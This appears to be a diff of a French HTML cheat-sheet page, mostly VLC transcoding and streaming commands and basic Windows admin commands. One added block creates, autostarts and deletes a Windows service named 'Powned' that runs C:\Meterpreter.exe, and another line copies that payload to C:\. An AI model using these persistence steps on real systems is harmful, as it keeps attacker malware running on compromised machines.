 &quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mp4a}:std{access=file,mux=mp4,dst=&#39;output.mp4&#39;}&quot; </code></pre>
-<h3 id="vers-avi"><a href="#TOC">vers AVI</a></h3>
+<h4 id="vers-avi"><a href="#TOC">vers AVI</a></h4>
 <pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp:sout=&quot;#transcode{vcodec=div3,vb=4000,fps=25,acodec=mp3,ab=192,channels=2,samplerate=48000,audio-sync,deinterlace,scale=1}:std{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; </code></pre>
-<h2 id="options-utiles"><a href="#TOC">Options utiles</a></h2>
+<h3 id="options-utiles"><a href="#TOC">Options utiles</a></h3>
 <pre><code>--audio, --no-audio Activer l&#39;audio (activé par défaut)
 --start-time &lt;second&gt; Démarre la vidéo à un temps donné
 --stop-time &lt;second&gt; Arrêtes la vidéo à un temps donné
 -I dummy N&#39;ouvre pas l&#39;interface graphique
 vlc://quit A mettre en fin de ligne pour fermer vlc</code></pre>
-<h2 id="net-casting-http"><a href="#TOC">Net casting http</a></h2>
+<h3 id="net-casting-http"><a href="#TOC">Net casting http</a></h3>
 <pre><code>vlc -I dummy v4l2:///dev/video0 --no-audio --sout &#39;#transcode{vcodec=mp4v,acodec=mpga,vb=900,ab=128}:std{access=http,mux=ogg,dst=192.168.0.227:8080}&#39;
 
 vlc http://ip:port</code></pre>
-<h2 id="devices"><a href="#TOC">Devices</a></h2>
+<h3 id="devices"><a href="#TOC">Devices</a></h3>
 <pre><code>Stream MRL syntax:
   [[access][/demux]://]URL[#[title][:chapter][-[title][:chapter]]]
   [:option=value ...]
@@ -204,9 +583,156 @@ URL syntax:
 
 v4l2:///dev/video0
 cdrom://</code></pre>
+<h1 id="windows-1"><a href="#TOC">Windows</a></h1>
+<h2 id="ligne-de-commande-windows"><a href="#TOC">Ligne de commande Windows</a></h2>
+<h3 id="gestion-des-utilisateurs"><a href="#TOC">Gestion des utilisateurs</a></h3>
+<h4 id="activation-dun-utilisateur"><a href="#TOC">activation d’un utilisateur</a></h4>
+<pre><code>net users sysadmin /active:yes</code></pre>
+<h4 id="désactivation-dun-utilisateur"><a href="#TOC">désactivation d’un utilisateur</a></h4>
+<pre><code>net users sysadmin /active:no</code></pre>
+<h3 id="gestion-des-services"><a href="#TOC">Gestion des services</a></h3>
+<pre><code>sc create Powned binPath= &quot;C:\Meterpreter.exe&quot;
+sc config Powned start= auto
+net start Powned
+sc delete Powned</code></pre>
+<h3 id="gestion-des-fichiers"><a href="#TOC">Gestion des fichiers</a></h3>
+<pre><code>xcopy Meterpreter.exe c:\</code></pre>
+<h3 id="commandes-utiles"><a href="#TOC">Commandes utiles</a></h3>
+<table>
+<col width="20%" />
+<col width="61%" />
+<thead>
+<tr class="header">
+<th align="left">Commande</th>
+<th align="left">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td align="left">regedit</td>
+<td align="left">Ouvre l’éditeur de registre</td>
+</tr>
+<tr class="even">
+<td align="left">services.msc</td>
+<td align="left">Ouvre le gestionnaire de services</td>
+</tr>
+<tr class="odd">
+<td align="left">secpol.msc</td>
+<td align="left">Ouvre les paramètres de sécurités locales</td>
+</tr>
+<tr class="even">
+<td align="left">inetcpl.cpl</td>
+<td align="left">Editeur d’option internet</td>
+</tr>
+</tbody>
+</table>
 <div id="footer">
   &copy; 2012 <a href="http://https://github.com/phil2600/tech-scribe/">Tech-Scribe</a>
 </div>
 
+<script language="JavaScript">
+
+function getRootNode(rootName)
+{
+  var toc = document.getElementById(rootName);
+  var navList = null;
+
+  for (var i = 0; i < toc.childNodes.length; i++)
+  {
+    var node = toc.childNodes[i];
+    if (node.tagName == "UL")
+    {
+      return node;
+    }
+  }
+}
+
+function expandListHideAll(rootName)
+{
+  lvl0 = getRootNode(rootName);
+
+  for (var i = 0; i < lvl0.childNodes.length; i++)
+  {
+    var lvl1 = lvl0.childNodes[i];
+    if (lvl1.tagName == "LI")
+    {
+      for (var j = 0; j < lvl1.childNodes.length; j++)
+      {
+        var lvl2 = lvl1.childNodes[j];
+        if (lvl2.tagName == "UL")
+        {
+          for (var k = 0; k < lvl2.childNodes.length; k++)
+          {
+            var node = lvl2.childNodes[k];
+            if (node.tagName == "LI")
+            {
+              for (var l = 0; l < node.childNodes.length; l++)
+              {
+                var childNode = node.childNodes[l];
+                if (childNode.tagName == "UL")
+                {
+                  childNode.style.display = "none";
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+function expandListExpand(e, parent)
+{
+  expandListHideAll(parent);
+
+  for (var j = 0; j < e.childNodes.length; j++)
+  {
+    if (e.childNodes[j].tagName == "UL")
+    {
+      e.childNodes[j].style.display = "block";
+    }
+  }
+}
+
+function expandListAdd(rootName)
+{
+  lvl0 = getRootNode(rootName);
+
+  for (var i = 0; i < lvl0.childNodes.length; i++)
+  {
+    var lvl1 = lvl0.childNodes[i];
+    if (lvl1.tagName == "LI")
+    {
+      for (var j = 0; j < lvl1.childNodes.length; j++)
+      {
+        var lvl2 = lvl1.childNodes[j];
+        if (lvl2.tagName == "UL")
+        {
+          for (var k = 0; k < lvl2.childNodes.length; k++)
+          {
+            var node = lvl2.childNodes[k];
+            if (node.tagName == "LI")
+            {
+              node.onmouseover = function(){expandListExpand(this, rootName)};
+
+              for (var l = 0; l < node.childNodes.length; l++)
+              {
+                var childNode = node.childNodes[l];
+                if (childNode.tagName == "UL")
+                {
+                  childNode.style.display = "none";
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+expandListAdd("TOC");
+</script>
 </body>
 </html>
